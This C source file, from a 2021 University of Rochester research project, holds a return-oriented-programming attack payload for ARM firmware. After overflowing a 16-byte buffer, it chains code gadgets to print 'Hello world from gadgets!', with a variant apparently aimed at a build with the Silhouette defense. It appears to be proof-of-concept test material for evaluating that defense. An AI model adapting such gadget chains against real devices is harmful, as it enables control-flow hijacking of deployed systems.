/*
 * Copyright (C) 2021 University of Rochester
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <stddef.h>

/* Attack payload string */
char payload[] = "0123456789abcde\x00"	// Content for buf
#ifdef SILHOUETTE
		 /* Gadget 1 and its inputs */
		 "\x00\x00\x00\x00"	// R7: 0
		 "\xb3\x04\x02\x00"	// PC: 0x204b2 <_cleanup_r+0xc> (pop {r2,r3,r5,r6,r7,pc})

		 /* Gadget 2 and its inputs */
		 "\x04\x00\x00\x00"	// R2: 4
		 "\x00\x00\x00\x00"	// R3: 0
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R6: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\xf9\x6e\x02\x00"	// PC: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})

		 /* Gadget 3 and its inputs */
		 "\x48\x00\x00\x00"	// R4: 0x48 ('H')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadgets 4 and 5 and their inputs */
		 "\x65\x00\x00\x00"	// R4: 0x65 ('e')
		 "\xf9\x6e\x02\x00"	// PC and R5: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a+> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadgets 6 and 7 and their inputs */
		 "\x6c\x00\x00\x00"	// R4: 0x6c ('l')
		 "\xf9\x6e\x02\x00"	// PC and R5: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a+> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadgets 8 and 9 and their inputs */
		 "\x6c\x00\x00\x00"	// R4: 0x6c ('l')
		 "\xf9\x6e\x02\x00"	// PC and R5: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a+> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadgets 10 and 11 and their inputs */
		 "\x6f\x00\x00\x00"	// R4: 0x6f ('o')
		 "\xf9\x6e\x02\x00"	// PC and R5: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a+> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadgets 12 and 13 and their inputs */
		 "\x20\x00\x00\x00"	// R4: 0x20 (' ')
		 "\xf9\x6e\x02\x00"	// PC and R5: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a+> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadgets 14 and 15 and their inputs */
		 "\x77\x00\x00\x00"	// R4: 0x77 ('w')
		 "\xf9\x6e\x02\x00"	// PC and R5: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a+> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadgets 16 and 17 and their inputs */
		 "\x6f\x00\x00\x00"	// R4: 0x6f ('o')
		 "\xf9\x6e\x02\x00"	// PC and R5: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a+> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadgets 18 and 19 and their inputs */
		 "\x72\x00\x00\x00"	// R4: 0x72 ('r')
		 "\xf9\x6e\x02\x00"	// PC and R5: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a+> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadgets 20 and 21 and their inputs */
		 "\x6c\x00\x00\x00"	// R4: 0x6c ('l')
		 "\xf9\x6e\x02\x00"	// PC and R5: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a+> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadgets 22 and 23 and their inputs */
		 "\x64\x00\x00\x00"	// R4: 0x64 ('d')
		 "\xf9\x6e\x02\x00"	// PC and R5: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a+> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadgets 24 and 25 and their inputs */
		 "\x20\x00\x00\x00"	// R4: 0x20 (' ')
		 "\xf9\x6e\x02\x00"	// PC and R5: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a+> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadgets 26 and 27 and their inputs */
		 "\x66\x00\x00\x00"	// R4: 0x66 ('f')
		 "\xf9\x6e\x02\x00"	// PC and R5: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a+> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadgets 28 and 29 and their inputs */
		 "\x72\x00\x00\x00"	// R4: 0x72 ('r')
		 "\xf9\x6e\x02\x00"	// PC and R5: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a+> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadgets 30 and 31 and their inputs */
		 "\x6f\x00\x00\x00"	// R4: 0x6f ('o')
		 "\xf9\x6e\x02\x00"	// PC and R5: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a+> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadgets 32 and 33 and their inputs */
		 "\x6d\x00\x00\x00"	// R4: 0x6d ('m')
		 "\xf9\x6e\x02\x00"	// PC and R5: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a+> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadgets 34 and 35 and their inputs */
		 "\x20\x00\x00\x00"	// R4: 0x20 (' ')
		 "\xf9\x6e\x02\x00"	// PC and R5: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a+> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadgets 36 and 37 and their inputs */
		 "\x67\x00\x00\x00"	// R4: 0x67 ('g')
		 "\xf9\x6e\x02\x00"	// PC and R5: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a+> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadgets 38 and 39 and their inputs */
		 "\x61\x00\x00\x00"	// R4: 0x61 ('a')
		 "\xf9\x6e\x02\x00"	// PC and R5: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a+> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadgets 40 and 41 and their inputs */
		 "\x64\x00\x00\x00"	// R4: 0x64 ('d')
		 "\xf9\x6e\x02\x00"	// PC and R5: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a+> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadgets 42 and 43 and their inputs */
		 "\x67\x00\x00\x00"	// R4: 0x67 ('g')
		 "\xf9\x6e\x02\x00"	// PC and R5: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a+> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadgets 44 and 45 and their inputs */
		 "\x65\x00\x00\x00"	// R4: 0x65 ('e')
		 "\xf9\x6e\x02\x00"	// PC and R5: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a+> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadgets 46 and 47 and their inputs */
		 "\x74\x00\x00\x00"	// R4: 0x74 ('t')
		 "\xf9\x6e\x02\x00"	// PC and R5: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a+> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadgets 48 and 49 and their inputs */
		 "\x73\x00\x00\x00"	// R4: 0x73 ('s')
		 "\xf9\x6e\x02\x00"	// PC and R5: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a+> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadgets 50 and 51 and their inputs */
		 "\x21\x00\x00\x00"	// R4: 0x21 ('!')
		 "\xf9\x6e\x02\x00"	// PC and R5: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a+> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadgets 52 and 53 and their inputs */
		 "\x0a\x00\x00\x00"	// R4: 0x0a ('\n')
		 "\xf9\x6e\x02\x00"	// PC and R5: 0x26ef8 <MPU_Init+0xf0> (pop {r4,r5,r6,r7,pc})
		 "\x00\x00\x00\x00"	// R6: 0
		 "\xf5\xbf\x00\x40"	// R7: 0x4000bff5
		 "\xcd\x61\x02\x00"	// PC: 0x261cc <__aeabi_i2d+0x5a+> (strb r4,[r7,#11]; ldr pc,[sp,r2])

		 /* Gadget 54 */
		 "\x00\x00\x00\x00"
		 "\xad\x68\x02\x00"	// PC: 0x000268ac <ResetISR+0xbc> (wfi; b 0x000268ac)
#else
		 /* Gadget 1 and its inputs */
		 "\x00\x00\x00\x00"	// R7: 0
		 "\xc9\x1b\x02\x00"	// PC: 0x00021bc8 <_realloc_r+0x7e> (pop {r0,r3,r4,r6,r7,pc})

		 /* Gadget 2 and its inputs */
		 "\x00\x60\x00\x20"	// R0: 0x20006000
		 "\x00\x00\x00\x00"	// R3: 0
		 "\x48\x00\x00\x00"	// R4: 0x48 ('H')
		 "\x00\x00\x00\x00"	// R6: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})

		 /* Gadget 3 and its inputs */
		 "\x65\x00\x00\x00"	// R4: 0x65 ('e')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})

		 /* Gadget 4 and its inputs */
		 "\x6c\x00\x00\x00"	// R4: 0x6c ('l')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})

		 /* Gadget 5 and its inputs */
		 "\x6c\x00\x00\x00"	// R4: 0x6c ('l')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})

		 /* Gadget 6 and its inputs */
		 "\x6f\x00\x00\x00"	// R4: 0x6f ('o')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})

		 /* Gadget 7 and its inputs */
		 "\x20\x00\x00\x00"	// R4: 0x20 (' ')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})

		 /* Gadget 8 and its inputs */
		 "\x77\x00\x00\x00"	// R4: 0x77 ('w')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})

		 /* Gadget 9 and its inputs */
		 "\x6f\x00\x00\x00"	// R4: 0x6f ('o')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})

		 /* Gadget 10 and its inputs */
		 "\x72\x00\x00\x00"	// R4: 0x72 ('r')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})

		 /* Gadget 11 and its inputs */
		 "\x6c\x00\x00\x00"	// R4: 0x6c ('l')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})

		 /* Gadget 12 and its inputs */
		 "\x64\x00\x00\x00"	// R4: 0x64 ('d')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})

		 /* Gadget 13 and its inputs */
		 "\x20\x00\x00\x00"	// R4: 0x20 (' ')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})

		 /* Gadget 14 and its inputs */
		 "\x66\x00\x00\x00"	// R4: 0x66 ('f')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})

		 /* Gadget 15 and its inputs */
		 "\x72\x00\x00\x00"	// R4: 0x72 ('r')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})

		 /* Gadget 16 and its inputs */
		 "\x6f\x00\x00\x00"	// R4: 0x6f ('o')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})

		 /* Gadget 17 and its inputs */
		 "\x6d\x00\x00\x00"	// R4: 0x6d ('m')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})

		 /* Gadget 18 and its inputs */
		 "\x20\x00\x00\x00"	// R4: 0x20 (' ')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})

		 /* Gadget 19 and its inputs */
		 "\x67\x00\x00\x00"	// R4: 0x67 ('g')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})

		 /* Gadget 20 and its inputs */
		 "\x61\x00\x00\x00"	// R4: 0x61 ('a')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})

		 /* Gadget 21 and its inputs */
		 "\x64\x00\x00\x00"	// R4: 0x64 ('d')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})

		 /* Gadget 22 and its inputs */
		 "\x67\x00\x00\x00"	// R4: 0x67 ('g')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})

		 /* Gadget 23 and its inputs */
		 "\x65\x00\x00\x00"	// R4: 0x65 ('e')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})

		 /* Gadget 24 and its inputs */
		 "\x74\x00\x00\x00"	// R4: 0x74 ('t')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})

		 /* Gadget 25 and its inputs */
		 "\x73\x00\x00\x00"	// R4: 0x73 ('s')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})

		 /* Gadget 26 and its inputs */
		 "\x21\x00\x00\x00"	// R4: 0x21 ('!')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})

		 /* Gadget 27 and its inputs */
		 "\x0a\x00\x00\x00"	// R4: 0x0a ('\n')
		 "\x00\x00\x00\x00"	// R5: 0
		 "\x00\x00\x00\x00"	// R7: 0
		 "\x29\x42\x02\x00"	// PC: 0x00025524 <ResetISR+0xac> (wfi; b 0x00025525)
#endif /* SILHOUETTE */
		 "";

/* Attack payload size */
size_t payload_size = sizeof(payload);
